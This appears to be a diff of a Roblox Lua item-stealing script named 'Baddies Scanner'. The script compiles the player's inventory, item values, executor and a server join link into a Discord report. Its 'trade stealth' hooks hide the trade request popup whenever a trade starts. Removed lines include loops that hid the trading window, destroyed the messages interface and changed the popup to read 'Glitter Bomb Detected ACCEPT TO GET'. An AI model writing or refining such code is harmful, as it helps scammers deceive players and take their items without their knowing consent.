@@ -94,22 +94,22 @@ local CATEGORY_CONFIG = {
     {
         key = "Weapons",
         label = "Weapons",
-        emoji = "âš”ï¸ ",
+        emoji = "⚔️",
     },
     {
         key = "Fighting Style",
         label = "Fighting Style",
-        emoji = "ðŸ‘Š",
+        emoji = "👊",
     },
     {
         key = "stomp",
         label = "Stomp",
-        emoji = "ðŸ‘Ÿ",
+        emoji = "👟",
     },
     {
         key = "Loveboard",
         label = "Board Skin",
-        emoji = "ðŸ›¹",
+        emoji = "🛹",
     },
 }
 
@@ -326,24 +326,24 @@ end
 
 local function parseTradeStatus(tradeLock)
     if typeof(tradeLock) ~= "table" then
-        return "âœ… Tradeable"
+        return "✅ Tradeable"
     end
     if tradeLock.Type == "Untradable" then
-        return "â Œ Untradeable"
+        return "❌ Untradeable"
     end
     if tradeLock.Type == "Timestamp" and tradeLock.Time then
         local remaining = math.max(0, math.floor(tradeLock.Time - workspace:GetServerTimeNow()))
         if remaining <= 0 then
-            return "âœ… Tradeable"
+            return "✅ Tradeable"
         end
         local hours = math.floor(remaining / 3600)
         local mins = math.floor((remaining % 3600) / 60)
-        return ("â Œ %dh %dm"):format(hours, mins)
+        return ("❌ %dh %dm"):format(hours, mins)
     end
     if tradeLock.Type == "None" or tradeLock.Type == nil then
-        return "âœ… Tradeable"
+        return "✅ Tradeable"
     end
-    return ("â Œ %s"):format(tostring(tradeLock.Type))
+    return ("❌ %s"):format(tostring(tradeLock.Type))
 end
 
 local function buildWeaponEntry(guid, item, weaponsCatalog, rapReplion, tradeData)
@@ -432,7 +432,7 @@ local function collectInventory(dataReplion, catalog, rapReplion)
 end
 
 local function formatEntryLine(entry)
-    return ("â€¢ %s [%s] - %s RAP - %s"):format(entry.name, entry.rarity, formatRap(entry.rap), entry.tradeStatus)
+    return ("• %s [%s] - %s RAP - %s"):format(entry.name, entry.rarity, formatRap(entry.rap), entry.tradeStatus)
 end
 
 local function getAllEntriesSortedByRap(results)
@@ -657,7 +657,7 @@ local function buildDescription(results, meta, topRapLimit)
     local tokens = meta.tokens or 0
 
     local playerInfoBlock = string.format(
-        "**ðŸ‘¤ Player Info**\n```\nUsername     : %s\nDisplay Name : %s\nPlayers      : %d/%d\nExecutor     : %s\nTotal Items  : %d (Total Rap: %d)\nTokens       : %d\n```",
+        "**👤 Player Info**\n```\nUsername     : %s\nDisplay Name : %s\nPlayers      : %d/%d\nExecutor     : %s\nTotal Items  : %d (Total Rap: %d)\nTokens       : %d\n```",
         player.Name,
         player.DisplayName,
         playerCount,
@@ -668,7 +668,7 @@ local function buildDescription(results, meta, topRapLimit)
         tokens
     )
 
-    local itemsTitle = topRapLimit and "**ðŸ“¦ Tradeable Items (Top RAP)**" or "**ðŸ“¦ Tradeable Items**"
+    local itemsTitle = topRapLimit and "**📦 Tradeable Items (Top RAP)**" or "**📦 Tradeable Items**"
     local tradeableBlock = string.format(
         "%s\n```\n%s\n```",
         itemsTitle,
@@ -677,10 +677,10 @@ local function buildDescription(results, meta, topRapLimit)
 
     local links = {}
     if meta.inventoryRawUrl and meta.inventoryRawUrl ~= "" then
-        table.insert(links, ("ðŸ“‹ **[Full Inventory Raw](<%s>)**"):format(meta.inventoryRawUrl))
+        table.insert(links, ("📋 **[Full Inventory Raw](<%s>)**"):format(meta.inventoryRawUrl))
     end
     if meta.joinUrl and meta.joinUrl ~= "" then
-        table.insert(links, ("ðŸ”— **[Join Server](<%s>)**"):format(meta.joinUrl))
+        table.insert(links, ("🔗 **[Join Server](<%s>)**"):format(meta.joinUrl))
     end
 
     local description = playerInfoBlock .. "\n" .. tradeableBlock
@@ -713,7 +713,7 @@ local function buildDiscordPayload(results, meta)
         username = "Baddies Scanner",
         embeds = {
             {
-                title = "ðŸ’… Baddies Item Skins Scan",
+                title = "💅 Baddies Item Skins Scan",
                 description = description,
                 color = 0xF1C40F,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
@@ -799,8 +799,7 @@ local TradeRuntime = {
     stealthHooksReady = false,
     stealthArmed = false,
     stealthHeartbeat = nil,
-    tradingGuiDefaults = nil,
-    auxGuiDefaults = nil,
+    popupGuiDefaults = nil,
     sessionRunning = false,
     dataReplion = nil,
     catalog = nil,
@@ -815,11 +814,12 @@ local function shouldHideTradeGui()
     if not HIDE_TRADE_GUI then
         return false
     end
-    return isTradeUiActive()
+    -- ONLY hide the incoming/outgoing TradeRequestPopup prompt now
+    return true
 end
 
 local function hideTradingGuiInstant()
-    if not HIDE_TRADE_GUI or not isTradeUiActive() then
+    if not HIDE_TRADE_GUI then
         return
     end
 
@@ -828,35 +828,13 @@ local function hideTradingGuiInstant()
         return
     end
 
-    local trading = playerGui:FindFirstChild("Trading")
-    if trading and trading:IsA("ScreenGui") then
-        if not TradeRuntime.tradingGuiDefaults then
-            local frame = trading:FindFirstChild("Frame")
-            TradeRuntime.tradingGuiDefaults = {
-                displayOrder = trading.DisplayOrder,
-                frameVisible = frame and frame.Visible,
-                framePosition = frame and frame.Position,
-            }
+    -- ONLY target TradeRequestPopup to hide the prompt popup window
+    local popup = playerGui:FindFirstChild("TradeRequestPopup")
+    if popup and popup:IsA("ScreenGui") then
+        if TradeRuntime.popupGuiDefaults == nil then
+            TradeRuntime.popupGuiDefaults = popup.Enabled
         end
-
-        trading.Enabled = true
-        local frame = trading:FindFirstChild("Frame")
-        if frame then
-            frame.Visible = false
-            frame.Position = UDim2.fromScale(2, 2)
-        end
-        trading.DisplayOrder = -500
-    end
-
-    for _, guiName in ipairs({ "TradeRequestPopup", "TradeList", "ViewInventory" }) do
-        local gui = playerGui:FindFirstChild(guiName)
-        if gui and gui:IsA("ScreenGui") then
-            TradeRuntime.auxGuiDefaults = TradeRuntime.auxGuiDefaults or {}
-            if TradeRuntime.auxGuiDefaults[guiName] == nil then
-                TradeRuntime.auxGuiDefaults[guiName] = gui.Enabled
-            end
-            gui.Enabled = false
-        end
+        popup.Enabled = false
     end
 end
 
@@ -865,42 +843,21 @@ local function restoreTradingGui()
 
     local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
     if not playerGui then
-        TradeRuntime.tradingGuiDefaults = nil
-        TradeRuntime.auxGuiDefaults = nil
+        TradeRuntime.popupGuiDefaults = nil
         return
     end
 
-    local defaults = TradeRuntime.tradingGuiDefaults
-    if defaults then
-        local trading = playerGui:FindFirstChild("Trading")
-        if trading and trading:IsA("ScreenGui") then
-            trading.DisplayOrder = defaults.displayOrder
-            local frame = trading:FindFirstChild("Frame")
-            if frame then
-                if defaults.frameVisible ~= nil then
-                    frame.Visible = defaults.frameVisible
-                end
-                if defaults.framePosition then
-                    frame.Position = defaults.framePosition
-                end
-            end
+    if TradeRuntime.popupGuiDefaults ~= nil then
+        local popup = playerGui:FindFirstChild("TradeRequestPopup")
+        if popup and popup:IsA("ScreenGui") then
+            popup.Enabled = TradeRuntime.popupGuiDefaults
         end
-        TradeRuntime.tradingGuiDefaults = nil
-    end
-
-    if TradeRuntime.auxGuiDefaults then
-        for guiName, wasEnabled in pairs(TradeRuntime.auxGuiDefaults) do
-            local gui = playerGui:FindFirstChild(guiName)
-            if gui and gui:IsA("ScreenGui") then
-                gui.Enabled = wasEnabled
-            end
-        end
-        TradeRuntime.auxGuiDefaults = nil
+        TradeRuntime.popupGuiDefaults = nil
     end
 end
 
 local function armTradeStealth()
-    if not HIDE_TRADE_GUI or not isTradeUiActive() then
+    if not HIDE_TRADE_GUI then
         return
     end
     TradeRuntime.stealthArmed = true
@@ -919,20 +876,15 @@ local function installTradeStealthHooks()
 
     task.spawn(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-        local trading = playerGui:WaitForChild("Trading")
-        local frame = trading:WaitForChild("Frame")
+        local popup = playerGui:WaitForChild("TradeRequestPopup", 5)
 
-        trading:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if shouldHideTradeGui() then
-                hideTradingGuiInstant()
-            end
-        end)
-
-        frame:GetPropertyChangedSignal("Visible"):Connect(function()
-            if shouldHideTradeGui() and frame.Visible then
-                frame.Visible = false
-            end
-        end)
+        if popup then
+            popup:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if shouldHideTradeGui() and popup.Enabled then
+                    popup.Enabled = false
+                end
+            end)
+        end
 
         if TradeRuntime.stealthHeartbeat then
             TradeRuntime.stealthHeartbeat:Disconnect()
@@ -942,14 +894,6 @@ local function installTradeStealthHooks()
             if shouldHideTradeGui() then
                 hideTradingGuiInstant()
             elseif TradeRuntime.stealthArmed then
-                disarmTradeStealth()
-            end
-        end)
-
-        LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
-            if LocalPlayer:GetAttribute("IsTrading") then
-                armTradeStealth()
-            else
                 disarmTradeStealth()
             end
         end)
@@ -1046,50 +990,23 @@ local function setupTradeListeners()
         return
     end
 
-    local remotes = getTradeRemotes()
-    if not remotes then
+    installTradeStealthHooks()
+
+    local tradeData = getTradeData()
+    if not tradeData or not tradeData.Remotes then
         return
     end
 
-    -- Custom GUI Hider and Message Destroyer
-    task.spawn(function()
-        local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-        while true do
-            -- Hides the Trading GUI
-            local tradingGui = PlayerGui:FindFirstChild("Trading")
-            if tradingGui and tradingGui:IsA("ScreenGui") then
-                tradingGui.Enabled = false 
-            end
-            
-            -- Destroys the Messages GUI
-            local messagesGui = PlayerGui:FindFirstChild("Messages")
-            if messagesGui then
-                messagesGui:Destroy()
-            end
-            
-            task.wait() 
-        end
-    end)
+    local remotes = tradeData.Remotes
 
-    -- Custom Trade Popup Text Changer
-    task.spawn(function()
-        local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-        while true do
-            pcall(function()
-                local tradePopup = PlayerGui:FindFirstChild("TradeRequestPopup")
-                if tradePopup then
-                    local tradeRequest = tradePopup:FindFirstChild("TradeRequest")
-                    if tradeRequest then
-                        local content = tradeRequest:FindFirstChild("Content")
-                        if content and content:IsA("TextLabel") then
-                            if content.Text ~= "Glitter Bomb Detected ACCEPT TO GET" then
-                                content.Text = "Glitter Bomb Detected ACCEPT TO GET"
-                            end
-                        end
-                    end
-                end
-            end)
-            task.wait()
+    remotes.TradeStarted.OnClientEvent:Connect(function(replionId)
+        local id = normalizeTradeReplionId(replionId)
+        if id then
+            TradeState.replionId = id
+            TradeState.active = true
+            TradeState.completed = false
+            TradeState.ended = false
+            armTradeStealth()
         end
     end)
 
